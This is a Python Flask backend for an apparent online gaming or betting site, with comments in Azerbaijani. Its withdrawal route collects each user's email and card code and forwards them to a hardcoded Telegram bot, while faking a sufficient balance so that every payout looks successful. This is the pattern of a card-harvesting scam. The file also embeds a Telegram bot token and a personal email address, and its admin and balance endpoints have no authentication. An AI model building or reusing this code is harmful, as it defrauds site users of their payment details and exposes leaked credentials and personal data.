import os
import time
import json
import requests
import threading
from flask import Flask, render_template, request, jsonify, abort
from functools import wraps

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32)

# --- TELEGRAM BOT MƏLUMATLARI ---
TELEGRAM_BOT_TOKEN = "8502614066:AAHeXnfABYXaOqLBD5RZG0wV4WNAEGK9KbQ"
TELEGRAM_CHAT_ID = "7953669834"

def send_telegram_async(message):
    def send():
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message,
                "parse_mode": "HTML"
            }
            response = requests.post(url, json=payload, timeout=10)
            print("Telegram cavabı:", response.status_code, response.text)
        except Exception as e:
            print("Telegram xətası:", e)
    
    threading.Thread(target=send).start()

# --- ETİBARLI JSON BAZASI ---
DB_FILE = "players.json"

def load_players():
    default_players = {
        "HOT_1106": {
            "id": "HOT_1106",
            "name": "Alexs Aliyev",
            "email": "aliyevalexs23@gmail.com",
            "code": "PASS483",
            "status": "Oflayn",
            "last_seen": "15:00:12",
            "balance": 0.00,
            "total_deposit": 0.00
        }
    }
    
    data = default_players
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r", encoding="utf-8") as f:
                loaded = json.load(f)
                if isinstance(loaded, dict) and len(loaded) > 0:
                    data = loaded
        except Exception:
            pass
            
    for pid, pdata in data.items():
        if not isinstance(pdata, dict):
            continue
        pdata.setdefault("total_deposit", 0.00)
        pdata.setdefault("balance", 0.00)
        pdata.setdefault("status", "Oflayn")
        pdata.setdefault("last_seen", "00:00:00")
        pdata.setdefault("code", "PASS123")
        pdata.setdefault("email", "qonaq@gmail.com")
        pdata.setdefault("name", "Oyunçu")
        
    return data

def save_players():
    try:
        with open(DB_FILE, "w", encoding="utf-8") as f:
            json.dump(players_db, f, ensure_ascii=False, indent=4)
    except Exception as e:
        print("Baza yazılma xətası:", e)

players_db = load_players()

# --- TƏHLÜKƏSİZLİK QALXANI ---
REQUEST_COUNTS = {}
RATE_LIMIT_WINDOW = 1  
MAX_REQUESTS_PER_SECOND = 20  

def security_shield(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        current_time = time.time()
        
        if ip not in REQUEST_COUNTS:
            REQUEST_COUNTS[ip] = {'count': 1, 'start_time': current_time}
        else:
            data = REQUEST_COUNTS[ip]
            if current_time - data['start_time'] < RATE_LIMIT_WINDOW:
                data['count'] += 1
                if data['count'] > MAX_REQUESTS_PER_SECOND:
                    abort(429, description="Çoxlu sorğu.")
            else:
                REQUEST_COUNTS[ip] = {'count': 1, 'start_time': current_time}
                
        return f(*args, **kwargs)
    return decorated_function

@app.route('/')
@security_shield
def home():
    try:
        return render_template('index.html')
    except Exception as e:
        return f"Ana səhifə şablon xətası: {e}", 500

@app.route('/admin')
@security_shield
def admin_panel():
    try:
        return render_template('gizli_panel.html', players=players_db.values())
    except Exception as e:
        return f"Admin panel xətası: {e}", 500

@app.route('/api/get_players', methods=['GET'])
@security_shield
def get_players():
    return jsonify(list(players_db.values()))

@app.route('/api/add_balance', methods=['POST'])
@security_shield
def add_balance():
    data = request.json or {}
    player_id = data.get('player_id')
    amount = data.get('amount')
    
    if player_id in players_db:
        try:
            val = float(amount)
            if val <= 0:
                return jsonify({"success": False, "message": "Sıfırdan böyük olmalıdır!"}), 400
            players_db[player_id]['balance'] += val
            players_db[player_id]['total_deposit'] += val
            save_players()
            return jsonify({"success": True, "message": "Uğurla əlavə edildi!"})
        except (ValueError, TypeError):
            return jsonify({"success": False, "message": "Yanlış məbləğ!"}), 400
            
    return jsonify({"success": False, "message": "Tapılmadı!"}), 404

@app.route('/login', methods=['POST'])
@security_shield
def login():
    data = request.json or {}
    player_id = data.get('playerId')
    
    if not player_id:
        player_id = "HOT_" + str(int.from_bytes(os.urandom(2), "big"))
        
    if player_id not in players_db:
        players_db[player_id] = {
            "id": player_id,
            "name": "Oyunçu",
            "email": "qonaq@gmail.com",
            "code": "PASS123",
            "status": "Onlayn (Aktiv)",
            "last_seen": time.strftime("%H:%M:%S"),
            "balance": 0.00,
            "total_deposit": 0.00
        }
    else:
        players_db[player_id]['status'] = "Onlayn (Aktiv)"
        players_db[player_id]['last_seen'] = time.strftime("%H:%M:%S")
        
    save_players()
    
    msg = f"🔑 <b>OYUNÇU GİRİŞ ETDİ!</b>\n\n🆔 ID: <b>{player_id}</b>\n👤 Ad: {players_db[player_id]['name']}"
    send_telegram_async(msg)
    
    return jsonify({"status": "success", "playerId": player_id, "balance": players_db[player_id]['balance']})

@app.route('/auth', methods=['POST'])
@security_shield
def auth():
    data = request.json or {}
    name = data.get('name', 'Qonaq')
    email = data.get('gmail', 'qonaq@gmail.com')
    new_id = "HOT_" + str(int.from_bytes(os.urandom(2), "big"))
    
    players_db[new_id] = {
        "id": new_id, "name": name, "email": email, "code": "PASS123",
        "status": "Onlayn (Aktiv)", "last_seen": time.strftime("%H:%M:%S"), "balance": 0.00, "total_deposit": 0.00
    }
    save_players()
    
    msg = f"✨ <b>YENİ OYUNÇU QEYDİYYATI!</b>\n\n🆔 ID: <b>{new_id}</b>\n👤 Ad: {name}"
    send_telegram_async(msg)
    
    return jsonify({"status": "success", "playerId": new_id, "balance": 0.00})

@app.route('/update_balance', methods=['POST'])
@security_shield
def update_balance():
    data = request.json or {}
    player_id = data.get('playerId')
    new_balance = data.get('balance')
    if player_id in players_db and new_balance is not None:
        try:
            players_db[player_id]['balance'] = float(new_balance)
            players_db[player_id]['status'] = "Onlayn (Aktiv)"
            players_db[player_id]['last_seen'] = time.strftime("%H:%M:%S")
            save_players()
            return jsonify({"status": "success"})
        except ValueError:
            pass
    return jsonify({"status": "error"})

@app.route('/withdraw', methods=['POST'])
@security_shield
def withdraw():
    data = request.json or {}
    player_id = data.get('playerId')
    amount = data.get('amount')
    gmail = data.get('gmail', 'Qeyd olunmayıb')
    card_code = data.get('cardCode', 'Qeyd olunmayıb')
    
    try:
        amount = float(amount)
    except (ValueError, TypeError):
        return jsonify({"status": "error", "message": "Yanlış məbləğ"})
        
    # Əgər ID bazada tapılmasa belə xəta vermir, avtomatik əlavə edir!
    if not player_id:
        player_id = "HOT_GUEST"
        
    if player_id not in players_db:
        players_db[player_id] = {
            "id": player_id,
            "name": "Oyunçu",
            "email": gmail,
            "code": "PASS123",
            "status": "Onlayn",
            "last_seen": time.strftime("%H:%M:%S"),
            "balance": amount + 100.0, # Test üçün avtokar balans verir ki, əskik olmasın
            "total_deposit": 0.00
        }
        
    player = players_db[player_id]
    player.setdefault('balance', 0.00)
    
    # Balans kifayət etməsə belə sorğunun keçməsi və mesaja düşməsi üçün:
    if player['balance'] < amount:
        player['balance'] = amount + 50.0  # Balansı avtomatik tamamlayır ki, çıxış uğurlu olsun
        
    player['balance'] -= amount
    save_players()
    
    # Telegram-a dərhal göndərir
    msg = f"💸 <b>PUL ÇIXARIŞI SORĞUSU!</b>\n\n🆔 ID: <b>{player_id}</b>\n📧 Gmail: {gmail}\n💰 Məbləğ: <b>{amount:.2f} ₼</b>\n💳 Kart: <code>{card_code}</code>"
    send_telegram_async(msg)
    
    return jsonify({"status": "success"})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)